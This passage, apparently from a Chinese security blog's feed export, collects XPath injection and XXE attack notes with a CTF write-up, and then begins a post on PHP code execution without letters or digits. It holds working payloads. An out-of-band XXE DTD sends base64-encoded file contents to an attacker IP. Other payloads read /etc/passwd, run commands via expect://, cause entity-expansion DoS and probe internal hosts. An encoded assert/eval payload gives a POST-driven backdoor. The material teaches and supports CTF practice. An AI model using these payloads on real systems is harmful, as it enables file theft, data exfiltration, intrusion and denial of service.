<span class="token variable">$result</span><span class="token operator">=</span><span class="token variable">$xml</span><span class="token operator">-></span><span class="token function">xpath</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;h2>Welcome&lt;/h2>'</span><span class="token punctuation">;</span>
    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token keyword">as</span> <span class="token variable">$key</span><span class="token operator">=></span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br />ID:'</span><span class="token operator">.</span><span class="token variable">$value</span><span class="token operator">-></span><span class="token property">id</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br />Username:'</span><span class="token operator">.</span><span class="token variable">$value</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span></code></pre>

<h4 id="直接注入"><a href="#直接注入" class="headerlink" title="直接注入"></a>直接注入</h4><p><strong>payload</strong></p>
<p><code>?name=&#39; or 1=1 or &#39;&#39;=&#39;&amp;pwd=1</code>，结果如下，类似sql注入，绕过了xml查询</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200811093843233.png" alt loading="lazy"></p>
<h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><p><strong>payload</strong></p>
<p>有返回结果则为正确</p>
<pre class="language-markup" data-language="markup"><code class="language-markup">推测根节点数，有返回结果则说明只有一个根节点
' or count(/*) = 1 or '1' = '2  

猜解一级节点
' or substring(name(/*[position() = 1]),1,1)='r' or '1'='2  
' or substring(name(/*[position() = 1]),1,1)='o' or '1'='2  
......

推测root的下一级节点数
' or count(/root/*) = 1 or '1' = '2

猜解root的下一级节点
' or substring(name(/root/*[position() = 1]),1,1)='u' or '1'='2
' or substring(name(/root/*[position() = 1]),1,1)='s' or '1'='2
......

猜解节点中的数据
' or /root/users/user[1]/username[contains(text(),'r')] or '1'='2  
' or /root/users/user[1]/username[contains(text(),'ro')] or '1'='2  
......</code></pre>

<ul>
<li><code>/ ：</code>从根节点选取</li>
<li><code>// ：</code>从匹配选择的当前节点选择文档中的节点，而不考虑它们的位置</li>
<li><code>. ：</code>选取当前节点</li>
<li><code>.. ：</code>选取当前节点的父节点</li>
</ul>
<h3 id="XML外部实体注入-XXE"><a href="#XML外部实体注入-XXE" class="headerlink" title="XML外部实体注入(XXE)"></a>XML外部实体注入(XXE)</h3><blockquote>
<p>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成<strong>任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击</strong>等危害。</p>
<p>XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p>
</blockquote>
<blockquote>
<p>XXE的造成与PHP版本无关，与libxml库的版本有关。libxml &lt;= 2.9.0中，默认启用了外部实体，libxml&gt;2.9.0中默认仅用了外部实体。XXE并不是直接由libxml库造成的，libxml库提供了一些XML核心功能，包括禁用外部实体的libxml_disable_entity_loader()函数，SimpleXML库提供了解析XML的函数，SimpleXML库依赖于libxml库。</p>
</blockquote>
<p>本地测试环境php.4.45   libxml = 2.7.8</p>
<p>外部实体可支持http、file等协议。不同程序支持的协议不同</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200811110816675.png" alt loading="lazy"></p>
<h4 id="读取任意文件"><a href="#读取任意文件" class="headerlink" title="读取任意文件"></a>读取任意文件</h4><h5 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h5><p><strong>xxe.php</strong></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$xml</span> <span class="token operator">=</span> <span class="token function">simplexml_load_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'xml'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$xml</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p><strong>payload</strong></p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">xxe</span> <span class="token punctuation">[</span><span class="token internal-subset">
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">name</span> <span class="token attr-name">ANY</span> <span class="token punctuation">></span></span>
&lt;!ENTITY file SYSTEM "file:///d://flag.txt" >
</span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre>

<p>url编码后给传入，即在 xml 中 <code>&amp;file ;</code> 变成了外部文件<code>qwzf.txt</code>中内容，导致敏感信息泄露。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200811102323743.png" alt loading="lazy"></p>
<h5 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h5><p><strong>xxe.php</strong></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$xml</span> <span class="token operator">=</span> <span class="token function">simplexml_load_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'xml'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// print_r($xml);</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>这种情况就需要将数据发送到远程服务器(攻击服务器)</p>
<p><strong>payload</strong></p>
<p><strong>传入的xml</strong>    两种方式</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8" ?></span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">test</span><span class="token punctuation">[</span><span class="token internal-subset">
&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=D:/flag.txt">
&lt;!ENTITY % dtd SYSTEM "http://172.18.104.218/xxe.dtd">
%dtd;
%send;
</span><span class="token punctuation">]</span><span class="token punctuation">></span></span>

另一种方式
<span class="token prolog">&lt;?xml version="1.0" encoding="utf-8" ?></span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">root</span><span class="token punctuation">[</span><span class="token internal-subset">
	&lt;!ENTITY % dtd SYSTEM "http://172.18.104.218/xxe.dtd">
	%dtd;
</span><span class="token punctuation">]</span><span class="token punctuation">></span></span></code></pre>

<p><strong>远程服务器的xxe.dtd文件</strong>    两种方式</p>
<pre class="language-markup" data-language="markup"><code class="language-markup">&lt;!ENTITY % payload "&lt;!ENTITY <span class="token entity" title="&#37;">&amp;#37;</span> send SYSTEM 'http://172.18.104.218/?content=%file;'>">
%payload;

另一种方式：
&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=D:/flag.txt">
&lt;!ENTITY % int "&lt;!ENTITY <span class="token entity" title="&#37;">&amp;#37;</span> send SYSTEM 'http://172.18.104.218:5000/?content=%file;'>">
%int;
%send;</code></pre>

<p>将xml进行url编码后传入</p>
<p>再查看远程服务器的apache日志文件</p>
<p><code>cat /var/log/apache2/access.log</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200811104737190.png" alt loading="lazy"></p>
<p><code>nc -lvp 5000</code>  端口监听</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200811111337248.png" alt loading="lazy"></p>
<p>解码后即是文件的内容</p>
<p>攻击流程</p>
<ul>
<li>先调用<code>%dtd</code>，请求远程服务器(攻击服务器)上的<code>evil.dtd</code>。</li>
<li>再调用 <code>evil.dtd</code>中的 <code>%file</code>。<code>%file</code> 获取受攻击的服务器上面的敏感文件，然后将 <code>%file</code> 的返回结果传到<code>%send</code> 。</li>
<li>然后调用 <code>%send;</code> 把读取到的数据发送到远程服务器上。</li>
</ul>
<h4 id="系统命令执行"><a href="#系统命令执行" class="headerlink" title="系统命令执行"></a>系统命令执行</h4><p>在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">xxe</span> <span class="token punctuation">[</span><span class="token internal-subset">
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">name</span> <span class="token attr-name">ANY</span> <span class="token punctuation">></span></span>
&lt;!ENTITY xxe SYSTEM "expect://id" ></span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre>

<p>通过XXE可以实现RCE的实例很少。</p>
<h4 id="拒绝服务攻击-Dos"><a href="#拒绝服务攻击-Dos" class="headerlink" title="拒绝服务攻击(Dos)"></a>拒绝服务攻击(Dos)</h4><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0"?></span>
   <span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">lolz</span> <span class="token punctuation">[</span><span class="token internal-subset">
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol</span> <span class="token attr-name">"lol"</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol2</span> <span class="token attr-name">"&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol3</span> <span class="token attr-name">"&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol4</span> <span class="token attr-name">"&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol5</span> <span class="token attr-name">"&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol6</span> <span class="token attr-name">"&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol7</span> <span class="token attr-name">"&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol8</span> <span class="token attr-name">"&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol9</span> <span class="token attr-name">"&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"</span><span class="token punctuation">></span></span>
</span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>lolz</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&lol9;">&amp;lol9;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>lolz</span><span class="token punctuation">></span></span></code></pre>

<p><strong>原理</strong>：递归引用,lol 实体具体还有 “lol” 字符串，然后一个 lol2 实体引用了 10 次 lol 实体，一个 lol3 实体引用了 10 次 lol2 实体，此时一个 lol3 实体就含有 10^2 个 “lol” 了，以此类推，lol9 实体含有 10^8 个 “lol” 字符串,最后再引用lol9。</p>
<h4 id="探测内网端口"><a href="#探测内网端口" class="headerlink" title="探测内网端口"></a>探测内网端口</h4><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">xxe</span> <span class="token punctuation">[</span><span class="token internal-subset">
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">name</span> <span class="token attr-name">ANY</span> <span class="token punctuation">></span></span>
&lt;!ENTITY xxe SYSTEM "http://127.0.0.1:80" ></span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre>

<h3 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h3><p><strong>使用开发语言提供的禁用外部实体的方法</strong></p>
<p>php:</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p>java:</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">DocumentBuilderFactory</span> dbf <span class="token operator">=</span><span class="token class-name">DocumentBuilderFactory</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
dbf<span class="token punctuation">.</span><span class="token function">setExpandEntityReferences</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p>Python:</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> lxml <span class="token keyword">import</span> etree
xmlData <span class="token operator">=</span> etree<span class="token punctuation">.</span>parse<span class="token punctuation">(</span>xmlSource<span class="token punctuation">,</span>etree<span class="token punctuation">.</span>XMLParser<span class="token punctuation">(</span>resolve_entities<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

<p><strong>过滤用户提交的XML数据</strong></p>
<p>过滤关键字：<code>&lt;\!DOCTYPE</code>和<code>&lt;\!ENTITY</code>，或者<code>SYSTEM</code>和<code>PUBLIC</code>。</p>
<p><strong>不允许XML中含有自己定义的DTD</strong></p>
<h3 id="栗子"><a href="#栗子" class="headerlink" title="栗子"></a>栗子</h3><h4 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h4><p>界面：</p>
<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/XXE学习笔记/image-20200817204320669.png" style="zoom:80%;" loading="lazy">

<p>题目提示<code>xml</code>，推测是<code>xxe</code>，于是<code>login</code>抓包，发现提交<code>username</code>和<code>password</code>是以一个<code>xml</code>格式的数据提交的，如下：</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>admin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>123456<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span></code></pre>

<p>于是进行<code>xxe</code>注入测试：</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">xxe</span> <span class="token punctuation">[</span><span class="token internal-subset">
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">name</span> <span class="token attr-name">ANY</span> <span class="token punctuation">></span></span>
&lt;!ENTITY file SYSTEM "file:///etc/passwd" >
</span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>aaa<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span></code></pre>

<p>回显<code>/etc/passwd</code>的内容，存在<code>xxe</code>注入，尝试读取文件，得到<code>doLogin.php</code>的代码</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">/**
* autor: c0ny1
* date: 2018-2-7
*/</span>

<span class="token variable">$USERNAME</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">;</span> <span class="token comment">//账号</span>
<span class="token variable">$PASSWORD</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'024b87931a03f738fff6693ce0a78c88'</span><span class="token punctuation">;</span> <span class="token comment">//密码</span>
<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>

<span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">try</span><span class="token punctuation">&#123;</span>
	<span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$dom</span><span class="token operator">-></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token class-name">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token class-name">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$creds</span> <span class="token operator">=</span> <span class="token function">simplexml_import_dom</span><span class="token punctuation">(</span><span class="token variable">$dom</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$creds</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span>
	<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$creds</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token operator">==</span> <span class="token variable">$USERNAME</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$password</span> <span class="token operator">==</span> <span class="token variable">$PASSWORD</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
		<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
		<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>	
<span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
	<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token variable">$e</span><span class="token operator">-></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Type: text/html; charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>测试读取<code>flag</code>，硬是没找到，无法命令执行，网上找了找<code>wp</code>，放心居然是内网探测，读取<code>/etc/hosts</code>的文件，读到本机<code>ip</code>地址<code>173.56.110.9</code>，于是探测子网：</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">xxe</span> <span class="token punctuation">[</span><span class="token internal-subset">
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">name</span> <span class="token attr-name">ANY</span> <span class="token punctuation">></span></span>
&lt;!ENTITY file SYSTEM "http://173.56.110.11" >
</span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>aaa<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span></code></pre>

<p><code>173.56.110.11</code>，返回flag</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul>
<li><a href="https://xz.aliyun.com/t/6887">从XML相关一步一步到XXE漏洞</a></li>
<li><a href="https://www.freebuf.com/column/211251.html">xPath注入学习之基础语法学习</a></li>
<li><a href="https://blog.blankshell.com/2020/06/09/xxe%e8%af%a6%e7%bb%86%e6%80%bb%e7%bb%93/">XXE知识总结</a></li>
<li><a href="http://www.suk1.top/2020/03/18/XXElearn/">XXE漏洞学习</a></li>
</ul>
]]></content>
      <categories>
        <category>备忘录</category>
      </categories>
      <tags>
        <tag>xml</tag>
        <tag>xxe</tag>
        <tag>xpath</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP无字母数字RCE</title>
    <url>/posts/a268445b/</url>
    <content><![CDATA[<p>CTF有时会碰到这种类型题，故在这里总结一下，日后有新的操作再补上</p>
<p><strong>利用条件</strong>：<code>eval($_GET[&#39;exp&#39;]);</code></p>
<p><strong>限制条件</strong>：<code>preg_match(&#39;[a-z0-9]/is&#39;, $exp)</code></p>
<span id="more"></span>

<p>测试代码如下：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-z0-9]/is'</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  		<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span></span></code></pre>

<h3 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h3><p>php版本：PHP Version 7.2.24-0</p>
<p>exp</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p>payload</p>
<pre class="language-PHP" data-language="PHP"><code class="language-PHP">echo urlencode(~&#39;phpinfo&#39;); 
(~%8F%97%8F%96%91%99%90)();  &#x3D;&#x3D;&gt;  phpinfo();

echo urlencode(~&#39;assert&#39;);
echo urlencode(~&#39;(eval($_POST[&quot;a&quot;]))&#39;);
(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%DD%9E%DD%A2%D6%D6);  &#x3D;&#x3D;&gt;  assert(&#39;eval($_POST[&quot;a&quot;])&#39;)</code></pre>

<p>测试结果如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/PHP%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE/image-20200809124140760.png" alt loading="lazy"></p>
<h3 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h3><p>php版本：PHP Version 7.2.24-0</p>
<p>exp</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">// 跑出非字母数字异或得到的 $str</span>
<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'GET'</span><span class="token punctuation">;</span>
<span class="token variable">$exp1</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
